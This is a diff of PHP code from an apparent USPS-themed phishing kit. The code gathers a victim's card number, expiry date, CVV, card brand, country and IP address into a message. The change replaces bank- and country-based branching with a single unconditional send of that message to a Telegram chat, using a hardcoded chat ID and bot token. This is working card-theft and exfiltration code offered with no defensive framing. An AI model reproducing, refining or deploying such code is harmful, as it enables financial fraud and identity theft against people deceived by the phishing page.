@@ -94,19 +94,9 @@ $_SESSION['_namebank_'] = $namebank   = $details->bank->name;
     $_SESSION['cn'] =$details[4];
 $message =   $_SESSION["msg"] ;
 $message .= "-------------------- <3 USPS <3-------------------\nBrand : ".$details[0]."\nType : ".$details[1]."\nLevel : ".$details[2]."\nCountry : ".$details[4]."\ncc  : ".$cc." (".$details[3].")\nexp : ".$_POST['expiry']."\ncvv : ".$_POST['cvc']."\nIP      : ".$ip."\n-------------------- <3 USPS <3-------------------\n";
-$_SESSION["msg"] = $message ;
-    $bn=   $_SESSION['bn'];
-    $cn=   $_SESSION['cn'];
-    if (strpos($bn, 'WELLS') !== false) {
-        sendMessageT('1064643518',$message,'6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk');
-    }
-    else if(strpos($cn, 'CANADA') !== false)
-    {
-        sendMessageT('1064643518',$message,'6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk');
-    }
-    else{
-        sendMessageT('1064643518',$message,'6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk');
-    }
+
+sendMessageT('1064643518',$message,'6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk');
+    $_SESSION["msg"] = $message ;
 
 
 if ($sms=='1'){
